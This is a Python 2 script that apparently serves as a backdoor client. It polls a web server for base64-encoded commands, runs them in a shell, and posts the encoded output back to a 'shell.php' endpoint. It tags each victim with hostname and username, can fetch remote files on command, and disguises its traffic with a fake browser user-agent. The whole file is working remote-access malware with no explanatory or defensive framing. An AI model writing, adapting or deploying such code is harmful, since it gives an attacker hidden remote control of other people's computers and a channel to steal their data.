#!/opt/local/bin/python

import socket,subprocess,re,time,urllib2,urllib,sys,base64,getpass
from sys import exit

# ---- Settings ----
server = "http://127.0.0.1/shell/"
sleep = 10
key = "qwe123"
use_proxy = "true"
# ---- End Settings ----

server_id = socket.gethostname()  + '-' + getpass.getuser()

def download(url):
	try:
		f = urllib.urlopen(url)
		file = f.read()
		f.close()
		f2 = open(dest_file, 'wb')
		f2.write(file)
		f2.close()
	except:
		pass
	return


if use_proxy == "true":
	proxy = urllib2.ProxyHandler()
	opener = urllib2.build_opener(proxy)
	urllib2.install_opener(opener)
	opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')]
else:
	opener = urllib2.build_opener()
	opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')]


while 1:


	try:
		cmd = urllib2.urlopen(server + "clients/" + str(server_id) + ".html").read()
	except urllib2.HTTPError, e:
		if e.code == 404:
			url = server + "shell.php"
			data = urllib.urlencode({'id' : server_id, 'key' : key, 'cmd' : ""})
			req = urllib2.Request(url, data)
			response = urllib2.urlopen(req)
		else:
			pass
	except urllib2.URLError, e:
		pass
	except httplib.HTTPException, e:
		pass


	try:
		time.sleep(sleep)
		cmd = urllib2.urlopen(server + "clients/" + str(server_id) + ".html").read()
		deccmd = base64.b64decode(cmd)
		if cmd == "":
			pass
		elif deccmd =="kill server":
			break
			sys.exit()
		elif "sleep" in deccmd:
			wait = deccmd.split(" ")
			sleep_now = float(wait[1])
			time.sleep(sleep_now)
		elif "download" in deccmd:
			geturl = deccmd.split(" ")
			src_file_url = geturl[1]
			dest_file = src_file_url.split('/')[-1]
			download(src_file_url)
		elif deccmd =="activate":
			sleep = 10
			url = server + "shell.php"
			data = urllib.urlencode({'id' : server_id, 'key' : key, 'cmd' : ""})
			req = urllib2.Request(url, data)
			response = urllib2.urlopen(req)
		elif deccmd == "deactivate":
			sleep = 300
		else:
			data = base64.b64decode(cmd)
			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdout_value = proc.stdout.read() + proc.stderr.read()
			url = server + "shell.php"
			encoded = base64.b64encode(stdout_value)
			data = urllib.urlencode({'id' : server_id, 'key' : key, 'cmd' : encoded})
			req = urllib2.Request(url, data)
			response = urllib2.urlopen(req)
			response = response.read()
        		if response == "Key is missing!":
                		break

	except :
    		pass

